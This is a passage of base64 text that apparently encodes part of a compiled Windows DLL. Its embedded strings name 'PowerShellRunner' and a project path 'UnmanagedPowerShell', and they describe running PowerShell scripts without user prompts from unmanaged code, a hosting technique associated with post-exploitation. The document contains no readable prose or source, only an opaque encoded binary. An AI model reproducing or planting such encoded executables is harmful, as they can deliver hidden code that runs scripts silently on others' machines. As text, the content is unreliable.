HMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABSUYAbAB1AHMAaABJAG4AcAB1AHQAQgB1AGYAZgBlAHIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABLRwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAQUsAZQB5AEEAdgBhAGkAbABhAGIAbABlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAgWNSAGUAYQBkAEsAZQB5ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABT1MAYwByAG8AbABsAEIAdQBmAGYAZQByAEMAbwBuAHQAZQBuAHQAcwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAABLUwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAASVMAZQB0AEIAdQBmAGYAZ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